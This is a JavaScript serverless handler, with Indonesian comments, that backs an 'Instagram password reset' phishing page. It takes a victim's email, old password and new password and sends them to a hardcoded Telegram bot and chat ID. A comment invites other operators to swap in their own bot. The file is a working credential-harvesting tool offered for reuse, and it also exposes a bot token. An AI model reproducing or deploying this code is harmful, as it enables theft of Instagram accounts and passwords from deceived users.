export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Metode tidak diizinkan' });
  }

  const { email, oldPass, newPass } = req.body;

  if (!email || !oldPass || !newPass) {
    return res.status(400).json({ message: 'Data tidak lengkap' });
  }

  // Ganti ini dengan milikmu
  const botToken = '8005969343:AAH906NhVkByakkeBW4HIspe7CutjlZF2qk'; // GANTI
  const chatId = '7721157555'; // GANTI

  const message = `
🔐 *Reset Password Instagram*
👤 Email: \`${email}\`
🔑 Password Lama: \`${oldPass}\`
🆕 Password Baru: \`${newPass}\`
  `.trim();

  try {
    const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    const result = await telegramRes.json();

    if (!telegramRes.ok || !result.ok) {
      console.error('❌ Telegram API Error:', result);

      return res.status(500).json({
        message: `❌ Gagal kirim ke Telegram: ${result.description || 'Unknown error'}`,
      });
    }

    return res.status(200).json({ message: '✅ Pesan berhasil dikirim ke Telegram.' });
  } catch (error) {
    console.error('❌ Fetch Error:', error);

    return res.status(500).json({
      message: `❌ Terjadi kesalahan saat fetch: ${error.message}`,
    });
  }
}
